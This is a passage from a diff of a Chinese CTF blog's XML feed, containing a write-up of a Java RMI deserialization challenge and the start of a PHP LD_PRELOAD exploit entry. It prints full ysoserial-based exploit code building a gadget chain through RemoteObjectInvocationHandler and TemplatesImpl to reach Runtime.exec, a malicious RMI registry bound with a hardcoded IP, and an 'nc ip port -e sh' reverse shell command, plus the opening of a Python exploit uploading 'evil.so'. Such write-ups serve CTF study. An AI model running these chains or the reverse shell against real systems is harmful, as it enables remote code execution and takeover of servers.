ysoserial.payloads.util.PayloadRunner;<br><span class="hljs-keyword">import</span> ysoserial.payloads.util.Reflections;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Type;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> java.lang.Class.forName;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TCTF3rmi</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">PayloadRunner</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ObjectPayload</span>&lt;<span class="hljs-title">Object</span>&gt; </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">getObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String command)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-keyword">final</span> Object templates = Gadgets.createTemplatesImpl(command);<br>        <span class="hljs-keyword">final</span> FactoryInter factoryInter = Gadgets.createMemoitizedProxy(Gadgets.createMap(<span class="hljs-string">&quot;getObject&quot;</span>, templates), FactoryInter.class);<br><br>        <span class="hljs-keyword">final</span> MyInvocationHandler myInvocationHandler = <span class="hljs-keyword">new</span> MyInvocationHandler();<br>        Reflections.setFieldValue(myInvocationHandler,<span class="hljs-string">&quot;object&quot;</span>,factoryInter);<br>        <span class="hljs-keyword">final</span> Friend friend = Gadgets.createProxy(myInvocationHandler,Friend.class,Templates.class);<br><br><br>        <span class="hljs-keyword">final</span> UserInter userInter = Gadgets.createMemoitizedProxy(<br>            Gadgets.createMap(<span class="hljs-string">&quot;getGirlFriend&quot;</span>, friend),<br>            UserInter.class,Templates.class);<br><br>        Gadget gadget = <span class="hljs-keyword">new</span> Gadget();<br>        Reflections.setFieldValue(gadget,<span class="hljs-string">&quot;user&quot;</span>,userInter);<br>        Reflections.setFieldValue(gadget,<span class="hljs-string">&quot;mName&quot;</span>,<span class="hljs-string">&quot;newTransformer&quot;</span>);<br><br>        <span class="hljs-keyword">return</span> gadget;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        PayloadRunner.run(TCTF3rmi.class, args);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isApplicableJavaVersion</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> JavaVersion.isAnnInvHUniversalMethodImpl();<br>    &#125;<br><br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>但最终是无法打通题目，可以问题出在看到从<code>memberValues</code>中获取到的对象是null。<br><img src="https://img-blog.csdnimg.cn/img_convert/118cd7e05bc76a0b31b5c1b0d24d8281.png"></p><p>原因在于在最开始已经说到spring1的链子有jdk版本限制，而题目的版本是jdk8u201，高版本下<code>AnnotationInvocationHandler</code>的readObject方法被修改了，无法控制this.memberValues的值了，所以也无法控制invoke的返回对象。下面看看到底在哪被限制了呢。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/fb54ee4015dc74dd9a6564fc0700d0ce.png"></p><p>jdk8u201版本下的<code>AnnotationInvocationHandler</code>如下,最终需要满足判断<code>var12 != null</code>才能获取HashMap中的键值然后put到var7中最后赋值给<code>MemberValues</code><br><img src="https://img-blog.csdnimg.cn/img_convert/94f9d4d82ce9e5727e0ee1ef3bed1301.png"></p><p>而<code>memberTypes</code>是从<code>AnnotationType</code>实例化后的对象获取到的，跟进<code>getInstance</code>。可以看到第一个参数指定var1必须是Annotation的子类，第二个参数是传入一个Map类型的var2。将var1赋值给成员变量type然后将var赋值给成员变量memberValues。<br><img src="https://img-blog.csdnimg.cn/img_convert/aa78e38d270087c1dd85f3a717d0cedc.png"></p><p>这里的分析其实就是CC1链子的分析网上也有很多文章，接着看到<code>AnonotationType</code>的构造函数。可以看到<code>memberTypes</code>的赋值是在构造函数中实现的。构造函数传的参数是AnnotationInvocationHandler的var0，然后通过反射获取了Annotation对象的所有方法，遍历方法名字赋值给var7，方法返回类型赋值给var8，最后将两者put到memberTypes成员变量中。<br><img src="https://img-blog.csdnimg.cn/img_convert/36029ed9783d1ec0b7280aa4922dbb6f.png"></p><p>所以回到readObject，要进入if里面就需要在HashMap里面put一个Annotation对象的方法名字，这里的Retention为Annotation的一个子类且有一个value的方法。</p><p>所以这样的话就只需要往HashMap中put一个键名是”value”的字符串就能进入到if中了。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/0e65f2c1e7c6d3c0ea8a54fb11af0575.png"></p><p>但是问题又来了，我们能够看到此时var4中存在两个map了，一个map中含有value键名，但另一个还是没有，所以当遍历到键名为getObject的map时还是无法进入到if中就无法获取到map的键值，那最终<code>MemberValues</code>的这个map的键值就是null，所以就会出现在<code>AnnotationInvocationHandler.invoke()</code>函数中从MemberValues获取对象结果为null的问题了。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/3bc2ac197fdbb89e0e735e554bc633e0.png"><br><img src="https://img-blog.csdnimg.cn/img_convert/7e460632824489675efb7e87849f4c9f.png"></p><p>而要解决这个问题就是找到一个Annotation的一个子类，这个子类的所有方法名中有叫<code>getObject</code>的方法。但显然这样的类无法找到。所以还是需要舍弃这个类去寻找新的类了。</p><h4 id="RemoteObjectInvocationHandler"><a href="#RemoteObjectInvocationHandler" class="headerlink" title="RemoteObjectInvocationHandler"></a>RemoteObjectInvocationHandler</h4><p>这个类的寻找也很简单官方wp上直接使用java代码遍历类设置条件筛选出可用的类或者直接使用codeql也很方便</p><figure class="highlight gradle"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gradle"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> FindClass &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> main(String[] args) &#123;<br>        Reflections reflections = <span class="hljs-keyword">new</span> Reflections();<br>        Set&lt;<span class="hljs-keyword">Class</span>&lt;? <span class="hljs-keyword">extends</span> InvocationHandler&gt;&gt; subTypesOf =<br>                reflections.getSubTypesOf(InvocationHandler.<span class="hljs-keyword">class</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">Class</span>&lt;? <span class="hljs-keyword">extends</span> InvocationHandler &gt; aClass : subTypesOf) &#123;<br>            <span class="hljs-keyword">if</span>(Serializable.<span class="hljs-keyword">class</span>.isAssignableFrom(aClass))&#123;<br>                System.out.<span class="hljs-keyword">println</span>(<br>                        aClass<br>                );<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs codeql">import java<br><br>from Class c <br>where c.getASupertype().hasName(&quot;InvocationHandler&quot;)<br>    and<br>    c.getASupertype*() instanceof TypeSerializable<br>select c<br><br></code></pre></div></td></tr></table></figure><p><code>RemoteObjectInvocationHandler</code>的invoke方法如下，可以看到这个类最终能调用到ref的invoke方法。<br>ref.invoke最终调用到的是StreamRemoteCall#executeCall方法。基本上所有客户端的请求，invoke-&gt;executeCall其实就是一条危险片段链，是rmi攻击手段中经常会见到的类。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/3f24631b256cc6169593dbdfd3fae5ce.png"></p><p>ref其实就是一个远程引用，里面保存着服务端的对象信息。就像我们调用Registry的bind方法时，绑定的也是远程引用。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/79f60a79d6d41906b5f4a73152e16ab2.png"></p><p>但是这里还是无法控制返回对象所以还是不能直接替换AnnotationInvocationHandler这个类，但是又有另外一个攻击思路了。</p><ul><li>首先我们自己实现两个接口然后绑定到注册中心，这样ref中保存的就是我们的自己实现接口后的类。</li><li>然后利用RemoteObjectInvocationHandler来代理UserInter接口让题目客户端反序列化时调用的方法是我们自己实现的方法，这样我们在自己实现的类里就能控制返回对象了。</li></ul><p>例如这样，只需要让题目客户端调用到我们自己实现的类即能控制返回对象。<br><img src="https://img-blog.csdnimg.cn/img_convert/db2b77ebd51821c0246ae8e78982d9c6.png"></p><h2 id="最终攻击-rce反序列化链"><a href="#最终攻击-rce反序列化链" class="headerlink" title="最终攻击-rce反序列化链"></a>最终攻击-rce反序列化链</h2><p>最终的链子如下。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.payloads;<br><br><span class="hljs-keyword">import</span> com.ctf.threermi.*;<br><span class="hljs-keyword">import</span> sun.rmi.server.UnicastRef;<br><span class="hljs-keyword">import</span> sun.rmi.transport.LiveRef;<br><span class="hljs-keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;<br><span class="hljs-keyword">import</span> ysoserial.payloads.util.Gadgets;<br><span class="hljs-keyword">import</span> ysoserial.payloads.util.PayloadRunner;<br><span class="hljs-keyword">import</span> ysoserial.payloads.util.Reflections;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.lang.reflect.Array;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><span class="hljs-keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;<br><span class="hljs-keyword">import</span> java.rmi.server.RemoteRef;<br><span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;<br><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">Gadget chain:</span><br><span class="hljs-comment">Gadget.readObject()</span><br><span class="hljs-comment">    UserInter(Proxy).getGirlFriend()</span><br><span class="hljs-comment">RemoteObjectInvocationHandler.invoke()</span><br><span class="hljs-comment">    UnicastRef.invoke()</span><br><span class="hljs-comment">                        StreamRemoteCall#executeCall()</span><br><span class="hljs-comment">                            UserInter.getGirlFriend()</span><br><span class="hljs-comment">                        Templates(Proxy).newTransformer()</span><br><span class="hljs-comment">                     MyInvocationHandler.invoke()</span><br><span class="hljs-comment">                        FactoryInter(Proxy).getObject()</span><br><span class="hljs-comment">                            RemoteObjectInvocationHandler.invoke()</span><br><span class="hljs-comment">                                UnicastRef.invoke()</span><br><span class="hljs-comment">                                    StreamRemoteCall#executeCall()</span><br><span class="hljs-comment">                                        FactoryInter.getObject()</span><br><span class="hljs-comment"> Method.invoke()</span><br><span class="hljs-comment">                            TemplatesImpl.newTransformer()</span><br><span class="hljs-comment">                                TemplatesImpl.getTransletInstance()</span><br><span class="hljs-comment">                                    TemplatesImpl.defineTransletClasses()</span><br><span class="hljs-comment">                                        TemplatesImpl.TransletClassLoader.defineClass()</span><br><span class="hljs-comment">                                            Pwner*(Javassist-generated).&lt;static init&gt;</span><br><span class="hljs-comment">                                                Runtime.exec()</span><br><span class="hljs-comment"> */</span><br> */<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">UserInter</span> </span>&#123;<br>    Registry registry;<br>    &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            registry = LocateRegistry.getRegistry(<span class="hljs-number">7777</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (RemoteException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">sayHello</span><span class="hljs-params">(String paramString)</span> <span class="hljs-keyword">throws</span> RemoteException </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Friend <span class="hljs-title">getGirlFriend</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException </span>&#123;<br>        FactoryInter factoryInter = <span class="hljs-keyword">null</span>;<span class="hljs-comment">//annotationInvocationHandler</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">final</span> Class&lt;?&gt;[] allIfaces = (Class&lt;?&gt;[]) Array.newInstance(Class.class, <span class="hljs-number">2</span>);<br>            allIfaces[<span class="hljs-number">0</span>] = FactoryInter.class;<br>            allIfaces[<span class="hljs-number">1</span>] = Remote.class;<br>            factoryInter = (FactoryInter) Proxy.newProxyInstance(FactoryInter.class.getClassLoader(),allIfaces,Proxy.getInvocationHandler(registry.lookup(<span class="hljs-string">&quot;factory&quot;</span>)));<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br><br>        <span class="hljs-keyword">final</span> MyInvocationHandler myInvocationHandler = <span class="hljs-keyword">new</span> MyInvocationHandler();<br>        <span class="hljs-keyword">try</span> &#123;<br>            Reflections.setFieldValue(myInvocationHandler,<span class="hljs-string">&quot;object&quot;</span>,factoryInter);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">final</span> Friend friend = Gadgets.createProxy(myInvocationHandler,Friend.class, Templates.class);<br>        <span class="hljs-keyword">return</span> friend;<br><br><br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FactoryImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">FactoryInter</span></span>&#123;<br>    String cmd;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">getObject</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-keyword">return</span> Gadgets.createTemplatesImpl(<span class="hljs-keyword">this</span>.cmd);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TCTF3rmiExp</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">PayloadRunner</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ObjectPayload</span>&lt;<span class="hljs-title">Object</span>&gt; </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">getObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String command)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-keyword">int</span> evilServerPort = <span class="hljs-number">7777</span>;<br>        Registry registry = LocateRegistry.createRegistry(evilServerPort);<br>        UserImpl user1 = <span class="hljs-keyword">new</span> UserImpl();<br>        registry.bind(<span class="hljs-string">&quot;UserImpl&quot;</span>, UnicastRemoteObject.exportObject(user1, evilServerPort));<br>        FactoryImpl factoryImpl = <span class="hljs-keyword">new</span> FactoryImpl();<br>        Reflections.setFieldValue(factoryImpl,<span class="hljs-string">&quot;cmd&quot;</span>,command);<br>        registry.bind(<span class="hljs-string">&quot;factory&quot;</span>, UnicastRemoteObject.exportObject(factoryImpl, evilServerPort));<br><span class="hljs-comment">//        ((UnicastRef) ((RemoteObjectInvocationHandler) ref).ref).getLiveRef().getEndpoint().getClass()</span><br>        InvocationHandler ref = Proxy.getInvocationHandler(registry.lookup(<span class="hljs-string">&quot;UserImpl&quot;</span>));<br><br>        Field field =  ref.getClass().getSuperclass().getDeclaredField(<span class="hljs-string">&quot;ref&quot;</span>);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        UnicastRef unicastRef =  (UnicastRef)field.get(ref);<br>        LiveRef liveRef = (LiveRef) Reflections.getFieldValue(unicastRef,<span class="hljs-string">&quot;ref&quot;</span>);<br>        TCPEndpoint tcpEndpoint = (TCPEndpoint)Reflections.getFieldValue(liveRef,<span class="hljs-string">&quot;ep&quot;</span>);<br>        Reflections.setFieldValue(tcpEndpoint,<span class="hljs-string">&quot;host&quot;</span>,<span class="hljs-string">&quot;10.122.207.125&quot;</span>);<br><br>        RemoteObjectInvocationHandler remoteObjectInvocationHandler = <span class="hljs-keyword">new</span> RemoteObjectInvocationHandler((RemoteRef) Reflections.getFieldValue(ref,<span class="hljs-string">&quot;ref&quot;</span>));<br>        <span class="hljs-keyword">final</span> UserInter user = (UserInter) Proxy.newProxyInstance(UserInter.class.getClassLoader(),<span class="hljs-keyword">new</span> Class[]&#123;UserInter.class,Remote.class&#125;,remoteObjectInvocationHandler);<br>        Gadget gadget = <span class="hljs-keyword">new</span> Gadget();<br>        Reflections.setFieldValue(gadget,<span class="hljs-string">&quot;user&quot;</span>,user);<br>        Reflections.setFieldValue(gadget,<span class="hljs-string">&quot;mName&quot;</span>,<span class="hljs-string">&quot;newTransformer&quot;</span>);<br><br>        <span class="hljs-keyword">return</span> gadget;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        PayloadRunner.run(TCTF3rmiExp.class, args);<br>    &#125;<br><br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>整体调试一下链子还是很顺利的。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/7f3924f40303a256daaa39e24a5200d5.png"><br><img src="https://img-blog.csdnimg.cn/img_convert/b745c9abb76494056a474fec9b59e527.png"></p><p>进入到UnicastRef.invoke()里面首先用newCall方法首先会建立一个连接到对应的RMI服务端。后面其实就是正常客户端获取RMIRegistry对象的流程了。<br><img src="https://img-blog.csdnimg.cn/img_convert/e54f022ee6c9e1b9885e5618cdc913a7.png"></p><p>StreamRemoteCall初始化会在自己的this.out属性中序列化一些属性进去<br><img src="https://img-blog.csdnimg.cn/img_convert/ea1fa13dd345bdfc1de2bb33ef5c27cd.png"><br>然后判断如果方法有参数，调用 marshalValue 将参数写入到输出流，然后调用 executeCall。但我们这里很明显getGirlFriend没有参数所以不进入。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/aabbaff32345144f35022e1038b633d6.png"></p><p>在executeCall中首先会释放输出流<br><img src="https://img-blog.csdnimg.cn/img_convert/e9a185cd5d9a1430bca09d8b7679e8a5.png"></p><p>然后获取服务端返回数据信息<br><img src="https://img-blog.csdnimg.cn/img_convert/758f487f08d539491199fd25c118e690.png"></p><p>然后读取第一个字节和81进行相等比较，81是在TransportConstants中定义好的代表Return标志位。<br><img src="https://img-blog.csdnimg.cn/img_convert/b841e87a94af33cf9a11aa69bfbbcd2d.png"><br><img src="https://img-blog.csdnimg.cn/img_convert/23b2065303b68a8b5a762118ca57ce82.png"></p><p>然后又会读取一个字节。读取的第二个字节会用于下面的流程判断，如果是1的话那么直接return，而如果是2的话，那么会对返回回来的数据进行反序列化（这是一个攻击点，也就是如果服务端返回回来的序列化数据，那么在这里客户端是可以进行反序列化的），其实ysoserial的JRMPListener就是利用的这里，实际上进入到<code>case 2</code>后就是处理TransportConstants.ExceptionalReturn报错情况，所以这也是为什么会说需要将payload放到报错信息中的原因。<br>这里很明显我们并没有进入到<code>case 2</code>。<br><img src="https://img-blog.csdnimg.cn/img_convert/3e591bbbc675a56407516bc6b4d3ba28.png"></p><p>跳出之后就是通过反序列化获取远程对象了<br><img src="https://img-blog.csdnimg.cn/img_convert/afcf17452b9e0a5a46d408feffc56d3e.png"><br><img src="https://img-blog.csdnimg.cn/img_convert/f620aa21928c77c2b602f45905cb2ce4.png"></p><p>最后我们能够使用到自己实现的类来控制返回对象，返回一个使用MyInvocationHandler代理了Templates和Friend两个接口的类<br><img src="https://img-blog.csdnimg.cn/img_convert/70fa31f362fa1475598b584436a5f632.png"></p><p>然后通过findMethod就能够找到newTransformer方法。<br><img src="https://img-blog.csdnimg.cn/img_convert/416d6f91987e95315f1ea00c1a72fc11.png"></p><p>然后第二行<code>this.user.getGirlFriend()</code>会进行上面同样的流程返回一个代理对象，然后通过反射调用这个类里面的newTransformer方法。又由于这个被MyInvocationHandler代理过所以会进入到MyInvocationHandler的invoke方法。<br><img src="https://img-blog.csdnimg.cn/img_convert/06e5dded558a9f7dc32a7f5e20af58cf.png"></p><p>这里只要再控制<code>this.object.getObject()</code>为一个TemplatesImpl实例对象就能成功调用newTransformer方法从而实例恶意字节码执行命令了。<br>这里控制返回对象的方法和上面<code>this.user.getGirlFriend()</code>是一摸一样的就不再跟进一遍了。<br><img src="https://img-blog.csdnimg.cn/img_convert/27d95d5ca4a3a712ca5a4998495689f4.png"></p><p>rce效果图<br><img src="https://img-blog.csdnimg.cn/img_convert/6fb877d85be30ecf41f3007c9074a8c2.png"></p><h3 id="攻击效果"><a href="#攻击效果" class="headerlink" title="攻击效果"></a>攻击效果</h3><p>先绑定恶意对象<br><img src="https://img-blog.csdnimg.cn/img_convert/e3be5bf5c90182cdbd7bbd53cd83abcd.png"></p><p>反序列化rce链子，题目docker环境没有curl和bash，但是有nc可能确实是特意给的，所以利用<code>nc ip port -e sh</code>即可反弹shell。<br><img src="https://img-blog.csdnimg.cn/img_convert/a8f0daee12deabf6720ae0277fe7fc5b.png"></p><p>最终getshell<br><img src="https://img-blog.csdnimg.cn/img_convert/0b941bc00d5821d135d9aa009898bfe3.png"></p><p>参考文章<br><a href="http://www.yongsheng.site/2022/07/11/RMI-attack/">http://www.yongsheng.site/2022/07/11/RMI-attack/</a></p><p><a href="https://www.cnblogs.com/zpchcbd/p/13517074.html">https://www.cnblogs.com/zpchcbd/p/13517074.html</a></p><p><a href="https://www.redmango.top/article/70">https://www.redmango.top/article/70</a></p><p><a href="https://tttang.com/archive/1430/">https://tttang.com/archive/1430/</a></p><p><a href="https://xie.infoq.cn/article/9a9387805a496e1485dc8430f">https://xie.infoq.cn/article/9a9387805a496e1485dc8430f</a></p><p><a href="https://wooyun.js.org/drops/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B7%A5%E5%85%B7ysoserial%E5%88%86%E6%9E%90.html">https://wooyun.js.org/drops/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B7%A5%E5%85%B7ysoserial%E5%88%86%E6%9E%90.html</a></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>ctf</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>ctf</tag>
+      
+      <tag>web</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>Delegatecall(2)</title>
     <link href="/2022/09/16/2022-9-16-Delegatecall(2)/"/>
     <url>/2022/09/16/2022-9-16-Delegatecall(2)/</url>
@@ -290,9 +317,9 @@
     
     <tags>
       
-      <tag>web</tag>
-      
       <tag>ctf</tag>
+      
+      <tag>web</tag>
       
     </tags>
     
@@ -317,9 +344,9 @@
     
     <tags>
       
-      <tag>web</tag>
-      
       <tag>ctf</tag>
+      
+      <tag>web</tag>
       
     </tags>
     
@@ -344,9 +371,9 @@
     
     <tags>
       
-      <tag>web</tag>
-      
       <tag>ctf</tag>
+      
+      <tag>web</tag>
       
     </tags>
     
@@ -371,9 +398,9 @@
     
     <tags>
       
-      <tag>web</tag>
-      
       <tag>ctf</tag>
+      
+      <tag>web</tag>
       
     </tags>
     
@@ -398,36 +425,9 @@
     
     <tags>
       
-      <tag>web</tag>
-      
       <tag>ctf</tag>
       
-    </tags>
-    
-  </entry>
-  
-  
-  
-  <entry>
-    <title>虎符初赛</title>
-    <link href="/2022/07/24/2022-7-24-%E8%99%8E%E7%AC%A6ctf%E5%88%9D%E8%B5%9B/"/>
-    <url>/2022/07/24/2022-7-24-%E8%99%8E%E7%AC%A6ctf%E5%88%9D%E8%B5%9B/</url>
-    
-    <content type="html"><![CDATA[<h1 id="虎符ctf初赛"><a href="#虎符ctf初赛" class="headerlink" title="虎符ctf初赛"></a>虎符ctf初赛</h1><h1 id="java-ezchain"><a href="#java-ezchain" class="headerlink" title="java-ezchain"></a>java-ezchain</h1><p>参考文章&gt;<br><a href="http://novic4.cn/index.php/archives/23.html">http://novic4.cn/index.php/archives/23.html</a><br><a href="https://ha1c9on.top/?p=1973">https://ha1c9on.top/?p=1973</a></p><h1 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h1><p>nginx的临时缓存文件配合LD_PRELOAD</p><p><a href="https://lewin.co.il/winning-the-impossible-race-an-unintended-solution-for-includers-revenge-counter-hxp-2021/">参考hxp题解</a><br>参考<a href="https://tttang.com/archive/1384/">https://tttang.com/archive/1384/</a></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> threading<br><span class="hljs-keyword">import</span> Thread<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> time<br>port = <span class="hljs-number">8020</span><br>host = <span class="hljs-string">&quot;ip&quot;</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">do_so</span>():</span><br>    data = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;evil.so&quot;</span>, <span 